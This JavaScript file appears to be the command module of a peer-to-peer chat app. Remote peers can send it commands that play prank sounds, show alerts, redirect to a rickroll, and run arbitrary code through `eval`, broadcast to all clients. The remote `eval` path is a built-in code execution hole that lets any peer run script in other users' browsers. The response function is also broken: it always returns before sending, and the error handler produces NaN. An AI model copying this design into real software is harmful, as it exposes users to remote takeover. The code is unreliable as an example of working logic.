function distribute_commands(command)
{
    console.log("command to execute:", command);
    let invoker = command.invoker;
    //QUEUE.push({"command":{"command_response": resp}})
    // {"command":{"command": {} }
    if (command.snd)
    {
        sound_command_handler(command.snd, invoker)
    }
    if (command.send_last_interaction)
    {
        get_my_last_interaction(invoker)
    }
    if (command.rickroll)
    {
        window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
    }
    if (command.eval)
    {
        try
        {
            let out = eval(command.eval);
            // send response to command invoker
            format_and_send_response({"info":out}, invoker);
        }
        catch (e)
        {
            format_and_send_response({"error":+e.toString()}, invoker);
        }
    }
    if (command.log)
    {
        console.log(command.log)
    }
    if (command.messages)
    {
        for (let message of command.messages)
        {
            add_message(message);
        }

    }

}


function sound_command_handler(link, invoker)
{
    let audio=false;
    if (link === "darude")
        audio = darude;
    else if (link === "relax")
        audio = relax;
    else if (link === "soup")
        audio = soup;

    if (audio)
    {
        try
        {
            audio.play();
            if (link === "darude")
            {
                setTimeout(()=>{alert("song pls?")}, 5000);
            }

            format_and_send_response({"info": `song played on ${IP}`}, invoker)
        }
        catch (e)
        {
            format_and_send_response({"info":`song failed on ${IP} because of ${e.toString()}`}, invoker)
        }
    }
    else
    {
        format_and_send_response({"info": `song not found ${link}`}, invoker)
    }
}

function get_my_last_interaction(invoker)
{
    if (client_interaction)
    {
        let seconds = Math.round(((new Date).getTime()-client_interaction)/1000);
        console.log("seconds", seconds);
        let minutes;
        let hours;
        if (seconds >= 60)
        {
            minutes = Math.round(seconds/60);
            seconds = Math.round(seconds%60);
        }
        if (minutes >= 60)
        {
            hours = Math.round(minutes/60);
            minutes = Math.round(minutes%60);
        }
        let msg = `${hours===undefined?"0":hours}h : ${minutes===undefined?"0":minutes}m : ${seconds}s`;
        format_and_send_response({"info": `client ${IP} interacted ${msg} ago!` }, invoker)
    }
    else
    {
        format_and_send_response({"info": `client ${IP} haven't interacted yet` }, invoker)
    }



}


function command_response_handler(action)
{
    let client = action.client;
    let response = action.command.command_response;

    if (response.info)
    {
        console.log(">>> " + response.info)
    }
    if (response.error)
    {
        console.log(">!> " + response.error)
    }

}

// response
// {"command":{"command_response":{"sonething": resp, "invoker": invoker}}, "client":IP}

function format_and_send_command(command_object, receiverIP)
{
    if (receiverIP)
        command_object.receiver = receiverIP;
    else
      command_object.receiver = "all";

    command_object.invoker = IP;
    let r = {"command": command_object};
    COMMAND_QUEUE.push(r);
    return r;
}

function format_and_send_response(resp_info)
{
    let invoker = IP;
    // dont send response to self
    if (invoker === IP)
        return;

    resp_info.invoker = invoker;
    let r = {"command_response":resp_info};
    console.log(r);
    COMMAND_QUEUE.push(r);
    return r
}

// some command shortcuts
function exec(key, arg, rec)
{
    switch (key)
    {
        case "darude":
            format_and_send_command({"snd":"darude"}, rec===undefined?"all":rec);
            break;
        case "relax":
            format_and_send_command({"snd":"relax"}, rec===undefined?"all":rec);
            break;
        case "eval":
            format_and_send_command({"eval":arg}, rec===undefined?"all":rec);
            break;
        case "inter":
            format_and_send_command({"send_last_interaction":"1"}, rec===undefined?"all":rec);
    }

}


